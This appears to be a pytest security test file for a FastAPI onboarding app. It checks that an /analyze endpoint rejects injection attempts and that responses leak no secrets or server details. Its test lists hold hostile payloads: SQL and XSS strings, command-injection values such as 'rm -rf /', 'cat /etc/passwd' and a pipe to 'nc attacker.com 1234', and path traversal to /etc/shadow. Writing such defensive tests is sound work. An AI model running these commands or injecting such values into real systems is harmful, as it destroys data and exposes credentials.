"""
Security tests for Bob Onboarding Accelerator with Gemini.
Tests for common vulnerabilities and security best practices.
"""
import pytest
from fastapi.testclient import TestClient
from backend.main import app

client = TestClient(app)


@pytest.mark.security
class TestSecurityVulnerabilities:
    """Security vulnerability tests."""
    
    def test_sql_injection_prevention(self):
        """Test that SQL injection attempts are handled safely."""
        malicious_urls = [
            "https://github.com/user/repo'; DROP TABLE users; --",
            "https://github.com/user/repo' OR '1'='1",
            "https://github.com/user/repo'; DELETE FROM repos; --"
        ]
        
        for url in malicious_urls:
            response = client.post(
                "/analyze",
                json={"url": url}
            )
            # Should reject with validation error, not execute SQL
            assert response.status_code in [400, 422]
    
    def test_xss_prevention(self):
        """Test that XSS attempts are sanitized."""
        xss_payloads = [
            "https://github.com/user/<script>alert('XSS')</script>",
            "https://github.com/user/repo<img src=x onerror=alert('XSS')>",
            "https://github.com/user/repo';alert(String.fromCharCode(88,83,83))//",
        ]
        
        for payload in xss_payloads:
            response = client.post(
                "/analyze",
                json={"url": payload}
            )
            # Should reject or sanitize, not execute script
            assert response.status_code in [400, 422]
            if response.status_code == 200:
                data = response.json()
                # Ensure no script tags in response
                assert "<script>" not in str(data).lower()
    
    def test_command_injection_prevention(self):
        """Test that command injection attempts are prevented."""
        command_injection_urls = [
            "https://github.com/user/repo; rm -rf /",
            "https://github.com/user/repo && cat /etc/passwd",
            "https://github.com/user/repo | nc attacker.com 1234",
            "https://github.com/user/repo`whoami`"
        ]
        
        for url in command_injection_urls:
            response = client.post(
                "/analyze",
                json={"url": url}
            )
            # Should reject with validation error
            assert response.status_code in [400, 422]
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are prevented."""
        traversal_urls = [
            "https://github.com/../../etc/passwd",
            "https://github.com/user/../../../etc/shadow",
            "https://github.com/user/repo/../../../../etc/hosts"
        ]
        
        for url in traversal_urls:
            response = client.post(
                "/analyze",
                json={"url": url}
            )
            # Should reject with validation error
            assert response.status_code in [400, 422]
    
    def test_api_key_not_exposed_in_response(self):
        """Test that API keys are not exposed in responses."""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        
        # Check that no sensitive data is in response
        response_str = str(data).lower()
        assert "api_key" not in response_str
        assert "secret" not in response_str
        assert "password" not in response_str
    
    def test_api_key_not_exposed_in_error(self):
        """Test that API keys are not exposed in error messages."""
        response = client.post(
            "/analyze",
            json={"url": "https://github.com/test/repo"}
        )
        
        # Even if it fails, should not expose API key
        response_str = str(response.json()).lower()
        assert "api_key" not in response_str
        assert len(response_str) < 10000  # Prevent information leakage
    
    def test_cors_configuration(self):
        """Test that CORS is properly configured."""
        # Test with allowed origin
        response = client.options(
            "/analyze",
            headers={
                "Origin": "http://localhost:5173",
                "Access-Control-Request-Method": "POST"
            }
        )
        assert response.status_code == 200
        assert "access-control-allow-origin" in response.headers
    
    def test_rate_limiting_headers(self):
        """Test that rate limiting information is not exposed."""
        response = client.get("/health")
        
        # Should not expose internal rate limiting details
        assert "x-ratelimit-limit" not in response.headers.keys()
    
    def test_server_header_not_exposed(self):
        """Test that server information is not exposed."""
        response = client.get("/health")
        
        # Should not expose server version
        server_header = response.headers.get("server", "").lower()
        assert "uvicorn" not in server_header or server_header == ""
    
    def test_error_messages_not_verbose(self):
        """Test that error messages don't expose internal details."""
        response = client.post(
            "/analyze",
            json={"url": "invalid"}
        )
        
        data = response.json()
        error_msg = str(data).lower()
        
        # Should not expose internal paths or stack traces
        assert "/app/" not in error_msg
        assert "traceback" not in error_msg
        assert "exception" not in error_msg
    
    def test_large_payload_rejection(self):
        """Test that excessively large payloads are rejected."""
        large_url = "https://github.com/user/" + "a" * 10000
        
        response = client.post(
            "/analyze",
            json={"url": large_url}
        )
        
        # Should reject or handle gracefully
        assert response.status_code in [400, 413, 422]
    
    def test_null_byte_injection(self):
        """Test that null byte injection is prevented."""
        null_byte_urls = [
            "https://github.com/user/repo\x00.txt",
            "https://github.com/user/repo%00",
        ]
        
        for url in null_byte_urls:
            response = client.post(
                "/analyze",
                json={"url": url}
            )
            # Should reject with validation error
            assert response.status_code in [400, 422]
    
    def test_unicode_normalization(self):
        """Test that unicode normalization attacks are prevented."""
        unicode_urls = [
            "https://github.com/user/repo\u202e",  # Right-to-left override
            "https://github.com/user/repo\ufeff",  # Zero-width no-break space
        ]
        
        for url in unicode_urls:
            response = client.post(
                "/analyze",
                json={"url": url}
            )
            # Should handle safely
            assert response.status_code in [200, 400, 422]
    
    def test_content_type_validation(self):
        """Test that content type is validated."""
        response = client.post(
            "/analyze",
            data="url=https://github.com/test/repo",  # Form data instead of JSON
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        # Should reject non-JSON content
        assert response.status_code in [400, 422]
    
    def test_method_not_allowed(self):
        """Test that only allowed HTTP methods work."""
        # GET on analyze endpoint should not be allowed
        response = client.get("/analyze")
        assert response.status_code in [405, 404]
        
        # PUT should not be allowed
        response = client.put("/analyze", json={"url": "test"})
        assert response.status_code in [405, 404]
    
    def test_no_directory_listing(self):
        """Test that directory listing is not enabled."""
        response = client.get("/")
        # Should not show directory listing
        assert response.status_code in [404, 200]
        if response.status_code == 200:
            assert "index of" not in response.text.lower()
    
    def test_security_headers(self):
        """Test that security headers are present."""
        response = client.get("/health")
        
        # Check for security headers (if implemented)
        headers = response.headers
        
        # These are optional but recommended
        # Uncomment when implemented
        # assert "x-content-type-options" in headers
        # assert "x-frame-options" in headers
        # assert "x-xss-protection" in headers

# Made with Gemini
